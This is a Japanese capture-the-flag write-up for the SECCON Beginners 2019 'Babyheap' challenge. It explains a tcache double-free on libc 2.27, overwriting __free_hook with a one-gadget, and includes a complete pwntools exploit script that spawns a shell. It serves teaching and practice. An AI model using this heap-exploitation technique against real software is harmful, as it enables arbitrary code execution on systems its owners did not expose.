---
tags: pwn
---

# SECCON Beginners CTF 2019 - Babyheap

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## writeup

### outline

tcache poisoningでDouble Freeを引き起こす問題、libcは2.27なので特にDouble Freeのチェックは行われない
なんとstdinのアドレスが与えられているのでlibcベースのリークとかいう面倒な作業が不要、やったね

### binary

checksecの結果は次の通り
```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
先に言っておくとこの問題は(名前からモロバレだが)Heapの問題である。故にSSP, NX辺りの防御機構の有無はあまり関係ない。
ここで注目すべきはFull RELROであるということで、つまりGOT Overwriteは出来ない。
のだが、`free`時に発火する`__free_hook`はFull RELROでも書き換えることが出来る。したがってこの問題の目標としてここを書き換えることを目指す。

問題のバイナリをghidraでデコンパイルした結果がこちら↓(※変数名等多少手を加えている)。

```c
undefined8 main(void)

{
  int input;
  char *ptr;
  
  printf("Welcome to babyheap challenge!\nPresent for you!!\n>>>>> %p <<<<<\n",stdin);
  while (input = menu(), input != 0) {
    if (input == 2) {
      free(ptr);
    }
    else {
      if (input == 3) {
        ptr = (char *)0x0;
      }
      else {
        if (input == 1) {
          if (ptr == (char *)0x0) {
            ptr = (char *)malloc(0x30);
            printf("Input Content: ");
            getnline(ptr,0x30);
          }
          else {
            puts("No Space!!");
          }
        }
      }
    }
  }
  return 0;
}
```

ローカル変数`ptr`に対し次のような3つの操作を行う事ができる

1. `alloc(s)`: mallocして確保した領域のポインタを`ptr`に代入、そこに`s`を書き込む、サイズは0x30で、`s`の書き込み時に確認も行っている上にヌル文字を最後に付与しているためHeap OverflowやOverreadは期待できない
2. `delete`: `free(malloc)`する
3. `wipe`: `ptr=0`にする

`alloc`に関しては`alloc`で`ptr`を上書き出来ないというよくわからない制約があるが、`delete`に関して特に制限が無いのでDouble Freeを引き起こす事が出来そう。

### libcベースリーク

この問題では最初に`stdin`のアドレスをくれる、というわけで配布されたlibc内でのアドレスを引けばlibcのベースアドレスが判明する。
これによって`__free_hook`や`system`, One Gadgetのアドレスも求める事ができる

### Double Free

無事にlibcのベースアドレスが求まったところでDouble Freeを利用して`__free_hook`にOne Gadgetを仕込むことを狙う。具体的には次のような手順を取った

1. `alloc("hoge")`
```
ptr = a
*a = "hoge"

~~ tcache ~~
 (none)
```
この時点ではまたtcacheにはどの領域も格納されていない

2. `delete`
```
ptr = a, *a = null

~~ tcache ~~
 a -> null
```
最初のfreeが発生したのでtcacheには`a`が入る。

3. `delete`
```
ptr = a, *a = a

~~ tcache ~~
 a -> a -> ...
```
`a`が再度freeされてしまったので`a`の`fd`が`a`になる。したがって一生`a`だけをmallocし続けるtcacheが完成する、やったね

4. `wipe`
```
ptr = null

~~ tcache ~~
 a -> a -> ...
```
`ptr`をwipeする、これで再びmallocが出来るようになる

5. `alloc(x)`
```
ptr = a, *a = x

~~ tcache ~~
 a -> x -> ???
```
mallocが発生したのでtcacheから領域を確保する。先頭が`a`だったので`ptr`は再び`a`を指すようになる。
そして`a`へ`x`を書き込む。これによってtcache中の`a`の`fd`が書き換わる事になり`x`を指すようになる。もちろん`x`に何の値が入っているかはわからないので`x`の次に何処が確保されるのかはわからない

6. `wipe`
```
ptr = null

~~ tcache ~~
 a -> x -> ???
```
再びmallocが出来るように

7. `alloc(y)`
```
ptr = a, *a = y

~~ tcache ~~
 x -> ???
```
先頭の`a`がmallocによって確保されたので次にmallocされる領域が`x`になる

8. `wipe`
```
ptr = null

~~ tcache ~~
 x -> ???
```
再びmallocが出来るように

9. `alloc(z)`
```
ptr = x, *x = z

~~ tcache ~~
 ???
```
`x`がmallocされてそこに`z`が書き込まれる。

この手順によって`*x = z`となったが`x,z`共にユーザーからの入力なので任意アドレスに任意の値を書き込む事ができるという状況である。したがって`x`に`__free_hook`のアドレスを、`z`にOne Gadgetや`system`のアドレスを設定することでシェルの起動へと繋げることが出来る、やったね。

というわけで無事に`__free_hook`へシェルを起動する為のアドレスを設定できたら後は`delete`を実行してfreeを呼ぶだけである。

実際に書いたExploitがこちら↓

## code

```python
from pwn import process, ELF, p64


def _select(s, sel, c="> "):
    s.recvuntil(c)
    s.sendline(str(sel))


def alloc(s, b="junk"):
    _select(s, 1)
    s.recvuntil(": ")
    s.sendline(b)


def delete(s):
    _select(s, 2)


def wipe(s):
    _select(s, 3)


if __name__ == '__main__':
    elf = ELF("babyheap")
    libc = ELF("libc-2.27.so")
    s = process("babyheap")
    s.recvuntil(">>>>> ")

    addr_stdin = int(s.recvline().split(b" ")[0][2:], 16)
    libc_base = addr_stdin - libc.symbols["_IO_2_1_stdin_"]
    addr_free_hook = libc_base + libc.symbols["__free_hook"]
    one_gadget = libc_base + 0x4f322

    print(hex(addr_stdin))
    print(hex(libc_base))
    print(hex(addr_free_hook))

    alloc(s)
    delete(s)
    delete(s)
    wipe(s)
    alloc(s, p64(addr_free_hook))
    wipe(s)
    alloc(s)
    wipe(s)
    alloc(s, p64(one_gadget))

    delete(s)

    s.interactive()
```

## Flag

ローカルでシェルの奪取に成功しただけなので無いです

## 参考文献

* https://ptr-yudai.hatenablog.com/entry/2019/05/26/150937
* https://qiita.com/kusano_k/items/c1c7ebec353d0bfdf1eb#babyheap-13-solves-448-points